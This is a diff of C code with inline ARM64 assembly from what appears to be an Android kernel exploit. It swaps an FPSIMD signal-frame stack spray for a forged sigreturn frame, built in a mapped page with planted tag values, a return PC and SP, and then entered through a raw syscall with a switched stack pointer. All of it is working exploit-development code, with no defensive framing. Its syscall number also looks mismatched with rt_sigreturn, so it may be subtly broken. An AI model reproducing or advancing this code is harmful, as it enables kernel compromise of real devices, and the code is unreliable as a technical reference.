@@ -2128,36 +2128,52 @@ void selfstamp_route(void) {
        * sigframe FPSIMD save writes 128B of controlled data at the
        * signal-frame depth (DEEPER than syscall frames — the Samsung
        * 5.15 route). Interleave with select spin for dual coverage. */
-      if (env_flag("FPSIMD_STAMP", 0)) {
-        static struct sigaction sa_set;
-        if (!sa_set.sa_handler) {
-          sa_set.sa_handler = SIG_DFL; /* minimal: SIGUSR1 default = term! */
-          /* NO — need a real handler: use a no-op function */
-        }
-        /* install no-op handler once */
-        {
-          static int installed = 0;
-          if (!installed) {
-            struct sigaction sa2;
-            memset(&sa2, 0, sizeof(sa2));
-            sa2.sa_handler = fpsimd_nop_handler;
-            sa2.sa_flags = SA_RESTART;
-            sigaction(SIGUSR2, &sa2, NULL);
-            installed = 1;
+if (env_flag("SIGRET_STAMP", 0)) {
+        static uint8_t *sframe = NULL;
+        static uint64_t ret_pc_v, ret_sp_v;
+        if (!sframe) {
+          sframe = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
+                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+          if (sframe == MAP_FAILED) {
+            pr_error("SIGRET mmap failed\n");
+          } else {
+            for (int i = 0; i < 4096 / 8; i++) {
+              uint64_t tag = 0xFEED0000000000C0ULL | (uint64_t)(i + 2);
+              memcpy(sframe + i * 8, &tag, 8);
+            }
+            uint32_t magic = 0x46508001;
+            uint32_t fsize = 536;
+            memcpy(sframe + 592, &magic, 4);
+            memcpy(sframe + 596, &fsize, 4);
+            uint64_t sm = 0;
+            memcpy(sframe + 456, &sm, 8);
+            uint64_t pst = 0;
+            memcpy(sframe + 176 + 264, &pst, 8);
+            pr_info("SIGRET frame=%p\n", sframe);
           }
         }
-        uint64_t ft[8];
-        for (int i = 0; i < 8; i++)
-          ft[i] = 0xFEED0000000000C0ULL + (uint64_t)(i + 2);
-        for (int fspin = 0; fspin < 2000; fspin++) {
+        if (sframe && sframe != MAP_FAILED) {
+          /* return PC = the address of the "1:" label below */
+          __asm__ volatile("adr %0, 1f" : "=r"(ret_pc_v));
+          memcpy(sframe + 176 + 256, &ret_pc_v, 8);
+          __asm__ volatile("mov %0, sp" : "=r"(ret_sp_v));
+          memcpy(sframe + 176 + 248, &ret_sp_v, 8);
           __asm__ volatile(
-              "ldp q0, q1, [%0]\n ldp q2, q3, [%0, #32]\n"
-              "ldp q4, q5, [%0, #64]\n ldp q6, q7, [%0, #96]\n"
-              :: "r"(ft)
-              : "v0", "v1", "v2", "v3", "v4", "v5", "v6", "v7");
-          syscall(SYS_tgkill, getpid(), syscall(SYS_gettid), SIGUSR2);
-          if (atomic_load(&consumer_success) >= 1)
-            break;
+              "mov x9, sp\n"
+              "mov sp, %0\n"
+              "mov x8, #119\n"
+              "svc #0\n"
+              "1:\n"
+              "mov sp, x9\n"
+              :
+              : "r"(sframe)
+              : "x8", "x9", "memory", "cc");
+          pr_info("SIGRET done\n");
+          for (;;) {
+            __asm__ volatile("yield" ::: "memory");
+            if (atomic_load(&consumer_success) >= 1)
+              break;
+          }
         }
       }
       for (;;) {
